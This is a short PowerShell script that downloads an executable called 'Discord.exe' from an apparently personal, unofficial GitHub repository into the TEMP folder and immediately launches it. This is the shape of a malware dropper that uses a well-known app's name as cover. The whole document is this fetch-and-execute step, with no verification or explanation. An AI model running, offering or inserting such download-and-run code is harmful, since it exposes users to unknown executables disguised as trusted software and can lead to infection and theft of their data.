$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/guncri/refs/heads/main/Discord.exe"
$file = "$env:TEMP\Discord.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
